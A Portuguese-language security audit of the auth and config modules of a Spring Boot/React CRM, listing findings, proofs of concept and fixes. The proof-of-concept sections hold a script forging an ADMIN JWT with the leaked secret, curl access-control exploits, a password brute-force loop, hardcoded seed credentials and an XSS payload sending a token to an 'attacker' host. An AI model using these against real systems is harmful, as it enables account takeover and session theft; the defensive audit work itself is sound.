# 🛡️ Relatório de Segurança: Módulos `auth` + `config` (transversal)

> **Data:** 2026-09-30
> **Escopo:** Autenticação, autorização, sessão/JWT, CORS, rate limiting, logging, configurações globais e as fronteiras de autorização entre módulos do monolito modular.
> **Stack:** Backend Spring Boot 4.1 / Java 25 (`photoizer-backend`) e Frontend React 19 / TS (`photoizer-frontend`).
> **Método:** Revisão de código (SAST manual) + Threat Modeling (STRIDE) + OWASP Top 10 / ASVS / CWE.
> **Arquivos-base analisados:** `auth/**`, `shared/config/**`, `shared/logging/**`, `shared/exception/**`, `config/**`, `cliente/service/ClienteAuthService.java`, `*Controller.java`, `application*.properties` e `features/auth/**` (frontend).

---

## 1. Resumo da Análise

### O que o código faz
O módulo `auth` implementa autenticação **stateless via JWT HS256** (access token de 24h, refresh token de 7 dias armazenado no banco) para a equipe (papéis `ADMIN`, `FOTOGRAFO`, `EDITOR`, `AGENDADOR`) e para **clientes** do e-commerce (papel `CLIENTE`). O `JwtAuthenticationFilter` valida o token em cada requisição e injeta a `Authentication` no `SecurityContext`. O `config` expõe parâmetros globais chave-valor (preço de foto extra, PIX da contratada, template de contrato) via `/api/v1/config`, com cache em memória.

### Superfície de ataque exposta
| Vetor | Detalhe |
|-------|---------|
| Endpoints públicos | `/api/v1/auth/login`, `/auth/refresh`, `/auth/cliente/login`, `/auth/cliente/registro`, `/ecommerce/galeria/**`, `/ecommerce/fotos/**`, `/propostas/publico/**`, `/avaliacoes`, `/h2-console/**`, `/swagger-ui/**`, `/actuator/health` |
| Emissão de identidade | Registro público de cliente emite JWT com papel `CLIENTE` para qualquer pessoa |
| Autorização | `anyRequest().authenticated()` + `@RolesAllowed` esparso em apenas 12 controllers |
| Segredos | Segredo JWT vem de `${JWT_SECRET:...}` com **fallback hardcoded**; senha de bootstrap hardcoded |
| Sessão no cliente | Tokens persistidos em `localStorage` |
| Banco (dev) | H2 em arquivo, console web habilitado e liberado |

### Veredito
A **autenticação** está razoavelmente implementada (BCrypt, JWT assinado, blocklist de access token, refresh persistido). O problema central é de **autorização**: o modelo é *fail-open* por padrão e o segredo de assinatura tem fallback conhecido. Em conjunto, os achados **C1–C4** permitem **comprometimento total do CRM** por um atacante anônimo.

### Tabela-resumo por severidade
| ID | Severidade | CWE / OWASP | Descrição |
|----|-----------|-------------|-----------|
| C1 | **Crítica** | CWE-798 / A02/A05 | Segredo JWT previsível (fallback hardcoded) → forja de token ADMIN |
| C2 | **Crítica** | CWE-862/863 / A01 | Broken Access Control sistêmico: `authenticated()` + `@RolesAllowed` esparso |
| C3 | **Crítica** | CWE-284 / A01 | Registro público de cliente concede identidade `CLIENTE` que desbloqueia C2 |
| C4 | **Crítica** | CWE-798/1391 / A07 | Credenciais de bootstrap `admin@photoizer.com` / `dev123` semeadas em qualquer profile |
| H1 | **Alta** | CWE-522/384 / A07 | Refresh token em texto puro, sem rotação/reuse detection, endpoint público |
| H2 | **Alta** | CWE-922 / A02 | Tokens em `localStorage` (admin e cliente) → exfiltração via XSS |
| H3 | **Alta** | CWE-307/204 / A07 | Rate limiting só na galeria/sessão; login/registro/refresh sem limite + enumeração de e-mail |
| H4 | **Alta** | CWE-532 / A09 | PII/senhas em log via `LoggingAspect` (records serializados como `String`) |
| H5 | **Alta** | CWE-200 / A05 | Swagger/OpenAPI e H2 console públicos em todos os profiles |
| M1 | Média | CWE-346 / A05 | CORS hardcoded para `localhost` |
| M2 | Média | CWE-459 / A04 | Blocklist de tokens sem expurgo → crescimento indefinido |
| M3 | Média | CWE-693/1021 / A05 | Ausência de HSTS/CSP; `frameOptions(sameOrigin)` |
| M4 | Média | CWE-602 / A01 | RBAC aplicado apenas no frontend (`ProtectedRoute`/`localStorage`) |
| L1 | Baixa | CWE-1188 / A05 | `ddl-auto=update` como fallback + matcher `/h2-console/**` mantido em todos os profiles |

---

## 2. Vulnerabilidades Críticas e de Alto Risco

### C1 — CRÍTICA: Segredo JWT previsível (fallback hardcoded)

- **Trecho do código:**
  `photoizer-backend/src/main/resources/application.properties:24`
  ```properties
  app.jwt.secret=${JWT_SECRET:photoizer-crm-secret-key-change-in-production-minimum-256-bits-long-for-hs256}
  ```
  Uso em `auth/config/JwtTokenProvider.java:28-35`:
  ```java
  this.secretKey = Keys.hmacShaKeyFor(secret.getBytes(StandardCharsets.UTF_8));
  ```
- **Impacto:** se a variável de ambiente `JWT_SECRET` não estiver definida (é o caso em dev, e nada garante que esteja em homolog/prod), o segredo usado para **assinar** os tokens é público (está versionado no repositório). Um atacante assina qualquer JWT — inclusive `{"papel":"ADMIN"}` — e obtém **acesso administrativo total**, sem sequer precisar de login. Isso anula C2 (pode escolher o papel que quiser) e dispensa C3.
- **Prova de Conceito (PoC) teórica:**
  ```bash
  # 1) Confirmar segredo default em uso (ex.: login aceita e token decodifica com o segredo público)
  # 2) Forjar um access token ADMIN localmente (HS256) usando o segredo acima
  python3 - <<'PY'
  import jwt, datetime
  secret = b"photoizer-crm-secret-key-change-in-production-minimum-256-bits-long-for-hs256"
  tok = jwt.encode(
      {"sub":"00000000-0000-0000-0000-000000000000","email":"x@x.com","papel":"ADMIN",
       "iat":datetime.datetime.utcnow(),"exp":datetime.datetime.utcnow()+datetime.timedelta(days=1)},
      secret, algorithm="HS256")
  print(tok)
  PY
  # 3) Acessar área sensível
  curl -H "Authorization: Bearer <token_forjado>" http://localhost:8080/api/v1/users
  ```
- **Correção Imediata:**
  1. Remover o fallback e **exigir** o secret: `app.jwt.secret=${JWT_SECRET}` (subida falha se ausente).
  2. Gerar segredo forte (≥ 256 bits) por ambiente: `openssl rand -base64 48`.
  3. Rotacionar o segredo atual (todos os tokens emitidos com o valor vazado devem ser considerados comprometidos).
  4. Preferir chaves assimétricas (RS256/ES256) para desacoplar assinatura de verificação.

---

### C2 — CRÍTICA: Broken Access Control sistêmico (default `authenticated` + `@RolesAllowed` esparso)

- **Trecho do código:**
  `auth/config/SecurityConfig.java:54`
  ```java
  .anyRequest().authenticated()
  ```
  A autorização por papel depende de anotações pontuais. Só **12 controllers** possuem `@RolesAllowed` (38 ocorrências). Não possuem **nenhuma** restrição de papel — logo qualquer token autenticado (inclusive `CLIENTE`) acessa:
  | Controller | Base path | Risco |
  |-----------|-----------|-------|
  | `ecommerce/api/AdminComprasController.java:26` | `/api/v1/admin/ecommerce/compras` | Confirmar/cancelar pagamentos (`:75-89`), baixar comprovantes, relatório financeiro |
  | `ecommerce/api/AdminAnalyticsController.java:17` | `/api/v1/admin/ecommerce/analytics` | Métricas de faturamento |
  | `ecommerce/api/AdminComentariosController.java:21` | `/api/v1/ecommerce/admin/comentarios` | Ler/responder comentários de qualquer agendamento |
  | `cliente/api/ClienteController.java:35` | `/api/v1/clientes` | Listar/editar/**excluir** clientes e PII (`:99-103`) |
  | `dashboard/api/DashboardController.java:13` | `/api/v1/dashboard` | KPIs, financeiro, top clientes |
  | `financeiro/api/FinanceiroRelatorioController.java:16` | `/api/v1/financeiro/relatorios` | Relatório fiscal, inadimplência, rentabilidade |
  | `comissao/api/IndicacaoController.java:23` | `/api/v1/comissoes` | Consulta de comissões por telefone |
  | `auth/api/UserController.java:31-41` | `/api/v1/users` (GET) | Lista todos os funcionários (só `criar` é ADMIN) |

- **Impacto:** um `CLIENTE` autenticado (ou qualquer conta forjada por C1) executa ações de administrador: confirmar pagamentos, excluir clientes, ler relatórios financeiros/fiscais e dados pessoais de todo o CRM. Combina escalonamento **vertical** (cliente → admin) e **horizontal** (ver dados de outros clientes).
- **Prova de Conceito (PoC) teórica:**
  ```bash
  # 1) Criar conta de cliente (público) e obter token CLIENTE
  TOKEN=$(curl -s -X POST http://localhost:8080/api/v1/auth/cliente/registro \
    -H 'Content-Type: application/json' \
    -d '{"nome":"atk","email":"atk@x.com","telefone":"11999999999","senha":"senha123"}' | jq -r .token)

  # 2) Listar todos os clientes do CRM (PII) e todos os funcionários
  curl -H "Authorization: Bearer $TOKEN" "http://localhost:8080/api/v1/clientes?perPage=1000"
  curl -H "Authorization: Bearer $TOKEN" http://localhost:8080/api/v1/users

  # 3) Confirmar pagamento de compra de outro cliente
  curl -X PATCH -H "Authorization: Bearer $TOKEN" \
    http://localhost:8080/api/v1/admin/ecommerce/compras/<id>/confirmar
  ```
- **Correção Imediata:**
  1. Adotar **negação por padrão**: no `SecurityConfig`, mapear explicitamente as rotas administrativas para papéis (`hasAnyRole(...)`), em vez de confiar no `authenticated()` genérico. Alternativa mais robusta: **proteger por classe** todos os controllers (colocar `@RolesAllowed` no nível da classe, como já feito em `ConfiguracaoController` e `DespesaController`) e manter apenas o mínimo público.
  2. Separar namespaces por confiança: `/api/v1/admin/**` e `/api/v1/financeiro/**` exigem `hasAnyRole("ADMIN","FOTOGRAFO","EDITOR")`; rotas de cliente exigem `hasRole("CLIENTE")` e validação de propriedade do recurso.
  3. Criar teste de arquitetura (ArchUnit) que **falhe o build** se um controller novo não tiver política de autorização declarada.

---

### C3 — CRÍTICA: Registro público de cliente concede identidade que desbloqueia C2

- **Trecho do código:**
  `cliente/service/ClienteAuthService.java:69,86`
  ```java
  var token = tokenService.generateToken(cliente.getId(), cliente.getEmail(), "CLIENTE");
  ```
  `cliente/api/ClienteAuthController.java:49-53` (público) → `SecurityConfig.java:43` (`permitAll`).
- **Impacto:** o endpoint de registro é aberto e devolve um JWT válido imediatamente. Como o modelo de autorização é *fail-open* (C2), **criar uma conta é o único passo necessário** para alcançar endpoints administrativos. Também permite criação massiva de contas (sem rate limit, ver H3) e enumeração de e-mails.
- **Prova de Conceito (PoC) teórica:** ver passo 1 de C2 (não requer validação de e-mail nem aprovação).
- **Correção Imediata:**
  1. Aplicar C2 — o token `CLIENTE` deve ter acesso **somente** às rotas de cliente e aos recursos que lhe pertencem (ownership check por `clienteId`).
  2. Se o cadastro precisar ser instantâneo, restringir o papel `CLIENTE` no `SecurityConfig` a um conjunto fechado de rotas (`/ecommerce/galeria/**`, `/auth/cliente/**`, `/ecommerce/sessao`), negando todo o resto.
  3. Adicionar verificação de e-mail/telefone (token) e rate limiting por IP (ver H3).

---

### C4 — CRÍTICA: Credenciais de bootstrap hardcoded

- **Trecho do código:**
  `auth/seed/AuthUserSeeder.java:42-46`
  ```java
  if (userRepository.count() == 0) {
      userRepository.save(
          new User("admin@photoizer.com", passwordEncoder.encode("dev123"), "Administrador", Papel.ADMIN)
      );
  }
  ```
- **Impacto:** em qualquer ambiente em que a tabela `users` esteja vazia (ex.: primeiro start em produção, banco recriado, restore), cria-se um ADMIN com credenciais **públicas no repositório**. Login trivial → controle total.
- **Prova de Conceito (PoC) teórica:**
  ```bash
  curl -X POST http://localhost:8080/api/v1/auth/login -H 'Content-Type: application/json' \
    -d '{"email":"admin@photoizer.com","password":"dev123"}'
  # → retorna accessToken + refreshToken de ADMIN
  ```
- **Correção Imediata:**
  1. Restringir o seeder ao profile `dev` (`@Profile("dev")`).
  2. Em homolog/prod, exigir criação do primeiro admin via variáveis de ambiente (`ADMIN_EMAIL`/`ADMIN_PASSWORD`) ou processo de bootstrap manual, com senha forte e troca obrigatória no primeiro acesso.
  3. Nunca versionar senhas — mesmo de desenvolvimento — e proibir login de contas seed acima de `dev`.

---

### H1 — ALTA: Refresh token em texto puro, sem rotação e endpoint público

- **Trecho do código:**
  `auth/model/RefreshToken.java:26-27`
  ```java
  @Column(nullable = false, unique = true, length = 500)
  private String token;   // valor JWT completo em claro
  ```
  `auth/service/RefreshTokenService.java:40-69` (não invalida/rotaciona o token usado) e `auth/api/AuthController.java:36-41` (`/refresh` público).
- **Impacto:** (a) vazamento do banco expõe refresh tokens utilizáveis; (b) um refresh token roubado é reutilizável por até 7 dias e **não é invalidado ao ser usado** (sem detecção de reuso); (c) o endpoint público de refresh amplifica tentativas offline. Não há revogação em massa no logout (apenas o refresh enviado).
- **Prova de Conceito (PoC) teórica:**
  ```bash
  # Reuso do mesmo refresh token repetidamente (sem rotação) → novos access tokens indefinidamente
  for i in 1 2 3; do
    curl -s -X POST http://localhost:8080/api/v1/auth/refresh \
      -H 'Content-Type: application/json' -d '{"refreshToken":"<roubado>"}'
  done
  ```
- **Correção Imediata:**
  1. **Rotação com reuse detection**: a cada `/refresh`, invalidar o token usado e emitir um novo; se um token já consumido for reapresentado, revogar toda a família (`revokeAllRefreshTokens(userId)`).
  2. Armazenar apenas **hash** (SHA-256) do refresh token no banco, não o valor.
  3. Encurtar expiração e exigir reautenticação para operações sensíveis.
  4. Aplicar rate limiting no `/refresh`.

---

### H2 — ALTA: Tokens de sessão em `localStorage`

- **Trecho do código (frontend):**
  `features/auth/services/auth.service.ts:16-30`
  ```ts
  const TOKEN_KEY = 'photoizer_auth_token'
  localStorage.setItem(TOKEN_KEY, response.token)
  localStorage.setItem(USER_KEY, JSON.stringify({ ...papel... }))
  ```
  `features/auth/customer/store.ts:13-26` (`persist` do Zustand grava o usuário/token de cliente em `localStorage`).
- **Impacto:** qualquer XSS (inclusive via dependência comprometida ou dado renderizado de forma insegura) executa `localStorage.getItem('photoizer_auth_token')` e exfiltra a sessão. Sem `HttpOnly`/`SameSite`, não há barreira. O interceptor `shared/api/interceptors.ts:11-20` confirma que ambos os tokens são Bearer anexados de `localStorage`.
- **Prova de Conceito (PoC) teórica:**
  ```html
  <!-- payload de XSS armazenado/refletido -->
  <img src=x onerror="fetch('https://attacker/?t='+localStorage.getItem('photoizer_auth_token'))">
  ```
- **Correção Imediata:**
  1. Preferir **cookies `HttpOnly`, `Secure`, `SameSite=Strict`** para o refresh token (e, idealmente, o access token), com CSRF token quando em cookie.
  2. Se mantiver Bearer em memória, armazenar o access token em variável de módulo (não persistente) e o refresh em cookie `HttpOnly`.
  3. Adicionar **CSP** restritiva e sanitização consistente (ver M3).
  4. Nunca confiar em `localStorage` para dados de autorização (papel) — ver M4.

---

### H3 — ALTA: Ausência de rate limiting em autenticação + enumeração de usuário

- **Trecho do código:**
  `shared/config/RateLimitFilter.java:54-61`
  ```java
  boolean matchesGalery = path.contains("/ecommerce/galeria/") || path.contains("/ecommerce/sessao");
  return !(matchesEndpoint && matchesGalery);
  ```
  Só aplica limite à galeria/sessão. `/auth/login`, `/auth/refresh` e `/auth/cliente/registro` **não têm limite**. A chave é só `remoteAddr` (`:81`) — inútil atrás de proxy. Além disso, `ClienteAuthService.java:52-57` responde `ClienteDuplicadoException("email"/"telefone")` → **enumeração de contas**.
- **Impacto:** brute force / credential stuffing nas contas administrativas; criação ilimitada de contas; enumeração de e-mails/telefones cadastrados; DoS no banco (BCrypt é caro).
- **Prova de Conceito (PoC) teórica:**
  ```bash
  # Sem throttling: tentar senhas em alta taxa
  for p in $(cat wordlist.txt); do
    curl -s -o /dev/null -w "%{http_code}\n" -X POST http://localhost:8080/api/v1/auth/login \
      -H 'Content-Type: application/json' -d "{\"email\":\"admin@photoizer.com\",\"password\":\"$p\"}"
  done
  # Enumeração: resposta distingue e-mail existente
  curl -X POST .../auth/cliente/registro -d '{"email":"vivo@x.com",...}'   # 409 se já existe
  ```
- **Correção Imediata:**
  1. Estender `RateLimitFilter` (ou usar Bucket4j) a `/auth/login`, `/auth/refresh`, `/auth/cliente/login`, `/auth/cliente/registro`, com limite agressivo e backoff.
  2. Chavear por IP **e** por e-mail/usuário; considerar `X-Forwarded-For` apenas de proxy confiável.
  3. Respostas uniformes no registro (não revelar se e-mail/telefone já existe) e no login.
  4. Bloqueio temporário de conta após N falhas; alertar sobre picos.

---

### H4 — ALTA: Vazamento de PII/senhas em logs

- **Trecho do código:**
  `shared/logging/LoggingAspect.java:68-87` + `shared/logging/SensitiveDataMask.java:41-58`
  ```java
  var args = SensitiveDataMask.maskArgs(joinPoint.getArgs());
  log.debug("[SERVICE] {} args=[{}]", methodName, args);
  ```
  ```java
  if (arg instanceof String s) { return mask(s); }
  return String.valueOf(arg);   // records serializam TODOS os campos
  ```
- **Impacto:** `AuthService.login(LoginRequest)` e `UserService.criar(CriarUserRequest)` recebem records cujos `toString()` incluem `password` em claro. A máscara só atua em argumentos `String`; o record passa direto. Com `logging.level` em `DEBUG` (comum em dev/homolog), senhas e PII (CPF/telefone/e-mail) vão para arquivo de log (`logs/`), que pode ser lido, exportado ou agregado (Logstash está configurado). Nota: os logs de controller/erro (`e.getMessage()`) também podem carregar dados sensíveis.
- **Prova de Conceito (PoC) teórica:**
  ```bash
  # Com DEBUG ligado, disparar login e observar o log
  grep -R "args=\[.*password" logs/ 2>/dev/null
  # ex.: [SERVICE] AuthService.login(..) args=[LoginRequest[email=admin@photoizer.com, password=dev123]]
  ```
- **Correção Imediata:**
  1. Excluir DTOs de credencial do aspect: `@Around("serviceLayer() && !argsOfType(LoginRequest) && ...")` ou nunca logar argumentos de tipos sensíveis.
  2. Anotar campos sensíveis (`@Sensitive`) e serializar via mapper que mascare `password`, `senha`, `senhaHash`, `token`, `cpf`, `pix`.
  3. Nunca logar corpos de requisição de auth; garantir `logging.level.*=INFO` em homolog/prod.
  4. Mascarar `e.getMessage()` antes de logar e nunca devolver stack trace ao cliente (já ok em `GlobalExceptionHandler.java:150-154`).

---

### H5 — ALTA: Swagger/OpenAPI e H2 console públicos

- **Trecho do código:**
  `auth/config/SecurityConfig.java:51-52`
  ```java
  .requestMatchers("/h2-console/**").permitAll()
  .requestMatchers("/swagger-ui/**", "/v3/api-docs/**").permitAll()
  ```
- **Impacto:** a documentação completa (todos os endpoints, parâmetros, modelos) fica acessível a anônimos — facilita mapeamento para explorar C2/C3. O `/h2-console/**` é liberado em todos os profiles (só é *habilitado* em `dev` via `application-dev.properties`, mas o matcher permanece). Sem isso, o atacante teria que descobrir as rotas.
- **Prova de Conceito (PoC) teórica:**
  ```bash
  curl -s http://localhost:8080/v3/api-docs | jq '.paths | keys'
  curl -sI http://localhost:8080/h2-console | head -1
  ```
- **Correção Imediata:**
  1. Desabilitar Swagger e H2 console em `homolog`/`prod` (`springdoc.api-docs.enabled=false`, `spring.h2.console.enabled=false`) e **condicionar os matchers ao profile**.
  2. Se precisar de docs, protegê-las com `hasRole("ADMIN")`.
  3. Remover o matcher `/h2-console/**` do profile de produção.

---

### M1 — MÉDIA: CORS hardcoded para `localhost`

- **Trecho do código:** `shared/config/CorsConfig.java:29-38`
  ```java
  config.setAllowedOrigins(List.of("http://localhost:5173", "http://127.0.0.1:5173"));
  config.setAllowedHeaders(List.of("*"));
  config.setAllowCredentials(true);
  config.setExposedHeaders(List.of("Authorization"));
  ```
- **Impacto:** o frontend de produção não é contemplado (quebra funcional) e o valor não é externalizável. `allowCredentials(true)` combinado a configuração fixa é um risco de misconfiguração; `Exposed-Headers: Authorization` expõe credencial a qualquer origem permitida. Em deploy real, alguém pode "resolver" colocando `*`, o que é proibido com credenciais — ou pior, refletindo origens.
- **Prova de Conceito (PoC) teórica:** requisição de origem maliciosa passa a ler a resposta se a origem for adicionada incorretamente (`Access-Control-Allow-Origin` + `Allow-Credentials`).
- **Correção Imediata:**
  1. Externalizar as origens por profile (`app.cors.allowed-origins`), sem `*` quando `allowCredentials=true`.
  2. Restringir `allowedHeaders` ao necessário; remover exposição de `Authorization` (não é preciso expor para ler o corpo).
  3. Manter `allowCredentials(true)` apenas se cookies forem realmente usados.

---

### M2 — MÉDIA: Blocklist de tokens sem expurgo

- **Trecho do código:** `auth/model/TokenBlocklist.java` + `auth/service/RefreshTokenService.java:80-95`
- **Impacto:** cada logout insere uma linha em `token_blocklist` que **nunca é removida** (mesmo após o token expirar). Crescimento indefinido → degradação de performance e vetor de esgotamento de recurso. Não há índice de limpeza nem job de expurgo.
- **Correção Imediata:** job agendado (`@Scheduled`) para deletar `expiresAt < now`; adicionar TTL; opcionalmente usar cache (Caffeine/Redis) com expiração automática em vez de tabela.
- **CWE:** CWE-459 (Incomplete Cleanup).

---

### M3 — MÉDIA: Headers de segurança ausentes

- **Trecho do código:** `auth/config/SecurityConfig.java:56`
  ```java
  .headers(h -> h.frameOptions(f -> f.sameOrigin()))
  ```
- **Impacto:** não há HSTS, CSP, `X-Content-Type-Options` explícito, `Referrer-Policy` ou `Permissions-Policy`. `frameOptions(sameOrigin)` permite enquadramento pela própria origem (necessário ao H2 console, mas enfraquece anti-clickjacking). Sem CSP, um XSS tem execução irrestrita (agrava H2).
- **Correção Imediata:**
  1. Habilitar HSTS e `Content-Security-Policy` (mínimo `default-src 'self'`; ajustar para o build do Vite).
  2. Usar `frameOptions(deny)` fora do profile `dev`.
  3. Adicionar `X-Content-Type-Options: nosniff`, `Referrer-Policy: strict-origin-when-cross-origin`.

---

### M4 — MÉDIA: RBAC aplicado apenas no frontend

- **Trecho do código:** `features/auth/AuthProvider.tsx:32-45` (lê usuário do `localStorage`), `features/auth/ProtectedRoute.tsx:11-31` (`allowedRoles.includes(papel)`).
- **Impacto:** `papel` e `isAuthenticated` vêm do `localStorage` sem validação. Editar o JSON exibe qualquer tela administrativa. É esperado que o backend rejeite — mas, dado C2, **o backend não rejeita** as rotas não anotadas. Ou seja, a única barreira passa a ser cosmética. `JSON.parse` sem `try/catch` (`auth.service.ts:36-39`) também lança em dado corrompido.
- **Correção Imediata:**
  1. Manter o guard de UI, mas tratá-lo como **defesa em profundidade**; a decisão real deve ser no backend (C2).
  2. Derivar papel/nome de um endpoint `/auth/me` validado pelo servidor em vez de `localStorage`.
  3. Envolver o `JSON.parse` em try/catch e limpar sessão corrompida.

---

### L1 — BAIXA: Configuração de perfil e console H2

- **Trecho do código:** `application.properties:17` (`ddl-auto=update` fallback), `application-dev.properties` (`spring.h2.console.enabled=true`).
- **Impacto:** como *fallback* fora de dev, `update` pode alterar schema silenciosamente; o matcher do console permanece ativo. Baixo isoladamente, relevante como higiene de produção.
- **Correção Imediata:** completar a migração para Flyway + Postgres com `ddl-auto=validate` (já previsto no `AGENTS.md`) e remover o matcher do H2 em produção.

---

## 3. Mapeamento de Débito Técnico de Segurança

| # | Item de Débito | Risco (CWE/OWASP) | Ação Recomendada (Refatoração) |
|---|----------------|-------------------|-------------------------------|
| D1 | **Modelo de autorização *fail-open***: `anyRequest().authenticated()` e dependência de `@RolesAllowed` manual por endpoint | CWE-862 / A01 | Inverter para **deny-by-default**. Centralizar o mapa rota→papel (ou anotar classes inteiras) e criar configuração "segura por padrão". |
| D2 | **Sem camada de política de autorização por módulo**: cada controller é responsável por lembrar a anotação | CWE-284 / A01 | Criar um componente compartilhado de autorização (ex.: `@RequireRole`/policy por base path) e testes ArchUnit que barram controller sem política. |
| D3 | **Segredo/credenciais embutidos** (JWT fallback e admin bootstrap) | CWE-798 / A02 | Externalizar 100% dos segredos; falhar o start sem `JWT_SECRET`; seeder apenas em `dev`; adicionar secret scanning no CI. |
| D4 | **Sessão no cliente**: tokens e papel em `localStorage`; nenhuma validação server-side do papel para UI | CWE-922 / A02 | Migrar para cookie `HttpOnly`+`Secure`+`SameSite` (refresh) e access token de curta duração em memória; endpoint `/auth/me`. |
| D5 | **Ciclo de vida de refresh token frágil**: hash em claro, sem rotação/reuse detection, logout parcial | CWE-522/384 / A07 | Rotação com detecção de reuso, hash do token, revogação em massa, expiração curta. |
| D6 | **Rate limiting pontual e chave frágil** | CWE-307 / A07 | Cobertura de todos os endpoints de auth; chave por IP+identidade; integração com proxy confiável; backoff. |
| D7 | **Logging sem contrato de privacidade**: aspect serializa DTOs inteiros | CWE-532 / A09 | Marcar campos sensíveis, excluir DTOs de credencial do aspect, mascaramento no ponto de emissão, revisão de nível de log por profile. |
| D8 | **Observabilidade/documentação expostas** (Swagger/H2) | CWE-200 / A05 | Habilitar por profile e proteger atrás de `ADMIN`. |
| D9 | **Ausência de testes de segurança**: `src/test/java` sem testes; nenhuma verificação automatizada de autorização | CWE-1059 / A04 | Criar suite de testes de BAC (cliente não acessa admin/financeiro), forja de JWT, limite de login e rotação de refresh. |
| D10 | **Headers de segurança ausentes / CORS fixo** | CWE-693/346 / A05 | HSTS+CSP+XCTO; origens CORS externalizadas por profile. |
| D11 | **Dados de PII em endpoints amplos**: `ClienteAdminResponse` lista CPF/telefone para qualquer autenticado | CWE-359 / A01 | Restringir a ADMIN/papéis apropriados e aplicar minimização de dados por papel. |

---

## 4. Análise de Fronteira (Foco Modular Monolith)

### 4.1 O que está correto
- **Inversão de dependência de token:** `shared/auth/TokenService.java` é uma abstração; o módulo `cliente` gera JWT sem importar `auth` (`ClienteAuthService.java:13,34`). Isso respeita a fronteira Modulith.
- **Serviços compartilhados neutros:** `CorsConfig`, `RateLimitFilter`, `SensitiveDataMask` e o `GlobalExceptionHandler` (que explicita não importar módulos de negócio) estão no `shared` e não vazam domínio.
- **`config` isolado:** `ConfiguracaoService` é tipo-safe (`ConfigKey`) e não acessa repositórios de outros módulos.

### 4.2 Vazamentos e riscos de fronteira
1. **Vazamento de autorização entre módulos (o mais grave).** Não existe um "dono" da política de acesso. O `SecurityConfig` (módulo `auth`) decide o *piso* (`authenticated`), mas cada módulo decide, opcionalmente, seu *teto* via `@RolesAllowed`. Resultado: módulos como `ecommerce`, `financeiro`, `cliente`, `dashboard` e `comissao` **compartilham a mesma credencial `CLIENTE` sem isolamento**, e a ausência de política = acesso liberado. Em STRIDE, é um **Elevation of Privilege** estrutural, não pontual.
   - *Exemplo concreto:* o token emitido pelo fluxo de `cliente` (e-commerce) alcança `FinanceiroRelatorioController` (módulo `financeiro`) e `AdminComprasController` (módulo `ecommerce` admin) — dados e ações de outro contexto de negócio, sem qualquer checagem.
2. **Contexto de identidade incompleto compartilhado entre módulos.** O `JwtAuthenticationFilter` injeta apenas `userId` (subject) e o papel; não há distinção de *realm* (`User` vs `Cliente` colidem no mesmo eixo de autenticação). Um `UUID` de `Cliente` e um de `User` têm o mesmo formato, e vários serviços buscam por `findById` sem validar o realm — risco de **IDOR cruzado** quando o papel não é verificado (C2). A fronteira "quem é o sujeito" não é explícita.
3. **Zero Trust interno não aplicado à autorização.** Os dados são tratados como confiáveis após o filtro JWT; não há revalidação de propriedade (ownership) nas camadas de serviço dos módulos consumidores. A confiança é concedida por estar "autenticado", não por "autorizado ao recurso".
4. **`config` como fonte de verdade global acessível por papel único (`ADMIN`)** — correto hoje, mas o `getConfig()` devolve **todas** as chaves (incluindo `pixChave`, `cnpjContratada`). Qualquer ampliação de acesso a `/api/v1/config` (ex.: para `FOTOGRAFO`) vazaria a chave PIX. Recomenda-se segregação de config sensível.

### 4.3 Recomendação de fronteira
Adicionar um módulo/segmento **`security` (política)** que declare explicitamente o contrato de acesso por contexto (staff vs cliente) e por recurso, sendo consumido por todos os módulos. Enquanto isso, a regra de ouro é: **nenhum controller sem política explícita**; e **`CLIENTE` deve ser um realm separado** (rota, filtro e autoridade distintos), impedindo que tokens de e-commerce alcancem módulos internos.

---

## 5. Checklist de Conformidade (OWASP / ASVS)

### Controles de Acesso
- [ ] Negação por padrão e política explícita por endpoint (C2)
- [ ] Separação de realms `User` (staff) × `Cliente` (e-commerce) (C3, §4.2)
- [ ] Verificação de propriedade do recurso (ownership/anti-IDOR) nas camadas de serviço
- [ ] `CLIENTE` impedido de alcançar `admin`, `financeiro`, `dashboard`, `clientes`, `users`
- [ ] Testes automatizados de BAC (cliente → admin retorna 403)

### Validação de Input
- [ ] Validação de formato/tamanho em todos os DTOs de auth (presente parcialmente: `ClienteRegistroRequest` OK)
- [ ] Respostas uniformes em login/registro (anti-enumeração) (H3)
- [ ] Rate limiting e backoff nos endpoints de autenticação (H3)

### Criptografia e Dados Sensíveis
- [ ] `JWT_SECRET` obrigatório, forte e sem fallback versionado (C1)
- [ ] Refresh token hasheado + rotação/reuse detection (H1)
- [ ] Tokens fora do `localStorage` (cookie `HttpOnly`/`Secure`) (H2)
- [ ] Sem senhas/credenciais hardcoded (C1, C4)
- [ ] Minimização de PII nas respostas por papel (D11)

### Logs e Monitoramento
- [ ] Sem senhas/PII em log (H4)
- [ ] Nível de log apropriado por profile; retenção e acesso controlados
- [ ] Alertas para picos de 401/403, falhas de login e uso de refresh (H1, H3)
- [ ] Swagger/H2 desabilitados ou protegidos em produção (H5)

### Configuração e Infra
- [ ] CORS externalizado por profile, sem `*` com credenciais (M1)
- [ ] Headers HSTS/CSP/XCTO/Referrer-Policy (M3)
- [ ] Expurgo da blocklist de tokens (M2)
- [ ] Flyway + `ddl-auto=validate` em homolog/prod (L1)

---

## 6. Plano de Remediação por Fases

### Fase 1 — Crítico (bloquear comprometimento total)
1. **C1:** remover fallback do `JWT_SECRET`; exigir segredo por ambiente e rotacionar o atual.
2. **C2:** proteger por papel (`hasAnyRole`) todas as rotas administrativas/financeiras; anotar classes inteiras; adicionar teste ArchUnit que falha controller sem política.
3. **C3:** restringir as rotas permitidas ao papel `CLIENTE` (allowlist) e rejeitar `CLIENTE` em qualquer rota não destinada a ele.
4. **C4:** `@Profile("dev")` no `AuthUserSeeder`; bootstrap de admin via env em homolog/prod.

### Fase 2 — Alto (defesa em profundidade)
5. **H1:** rotação de refresh + hash + detecção de reuso + revogação em massa.
6. **H3:** rate limiting em `/auth/**` com chave IP+identidade; respostas uniformes no registro.
7. **H4:** excluir DTOs de credencial do `LoggingAspect`; mascarar PII e senhas.
8. **H2 + M4:** mover refresh para cookie `HttpOnly`; `/auth/me` para derivar papel; tratar `JSON.parse`.
9. **H5:** desabilitar/proteger Swagger e H2 por profile.

### Fase 3 — Médio (configuração e higiene)
10. **M1:** CORS por profile, restringindo headers e removendo `Expose-Headers: Authorization`.
11. **M3:** HSTS + CSP + `nosniff`; `frameOptions(deny)` fora de dev.
12. **M2:** expurgo agendado da blocklist.
13. **L1:** concluir Flyway/Postgres e `validate`.

### Fase 4 — Verificação contínua
14. **D9:** suite de testes de segurança (BAC, forja de JWT, rate limit, rotação de refresh, vazamento de log).
15. Adicionar SAST/secret scanning no CI e revisão obrigatória de segurança para novos controllers/rotas.

---

## 7. Referências de Código

